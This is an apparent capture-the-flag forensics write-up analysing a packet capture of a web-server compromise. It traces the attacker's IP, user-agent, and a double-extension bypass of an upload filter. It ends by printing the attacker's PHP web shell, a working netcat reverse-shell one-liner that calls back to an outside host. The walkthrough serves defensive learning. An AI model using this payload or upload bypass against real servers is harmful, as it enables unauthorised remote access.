# 🕵️ WebStrike PCAP Forensics 

📘 **Scenario**  
A suspicious file upload was detected on a company web server. The development team flagged potential malicious activity, prompting the network team to capture live traffic using a packet sniffer. Your mission: analyze the `.pcap` file and determine:

- Where the attack originated  
- How the attacker gained access  
- What was uploaded to the server  
- Whether any data exfiltration occurred  

This challenge simulates a **real-world reverse shell attack**, requiring full-packet inspection, HTTP stream analysis, and exploitation tracing.

---

## 🛠️ Tools Used
- **Wireshark** – Packet-level analysis and TCP stream inspection  
- **ipgeolocation.io** – IP tracing and attacker location  
- **tcp.stream** + **Follow HTTP Stream** – to reconstruct web requests  
- **Command line forensics** – to extract payload details

---

## 📊 Analysis Breakdown

### 1️⃣ Attacker Origin: Geolocation & IP Address

- **Source IP:** `117.11.88.124`  
- **Victim IP:** `24.49.63.79`

Using Wireshark → Statistics → Endpoints, I isolated the suspicious external IP.  
Querying this IP on [ipgeolocation.io](https://ipgeolocation.io) returned:

> 📍 **Location:** Tianjin, China

This geolocation provides context for threat intelligence, blocking strategies, and profiling.

---

### 2️⃣ Attacker’s User-Agent String

Using **Follow HTTP Stream** in Wireshark, I pulled the headers from the attacker’s HTTP GET request:

> **User-Agent:**  
> `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0`

This spoofed Linux Firefox agent was likely used to blend in with normal web traffic and avoid suspicion during the exploit phase.

---

### 3️⃣ Exploited Upload Vulnerability – Web Shell Delivery

The attacker attempted to upload a PHP-based web shell via `/reviews/upload.php`.  

- ❌ **Failed attempt:** `image.php` – rejected due to extension
- ✅ **Successful bypass:** `image.jpg.php` – accepted due to weak validation

The server responded with:

> **“File uploaded successfully”**  

✅ This confirmed the shell was stored in:  
`/reviews/uploads/image.jpg.php`

This demonstrates how attackers bypass upload filters with **double extensions**, especially if MIME types aren't enforced.

---

### 4️⃣ Reverse Shell Execution & Port Used

Inside `image.jpg.php`, the attacker injected a reverse shell using `Netcat (nc)`:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
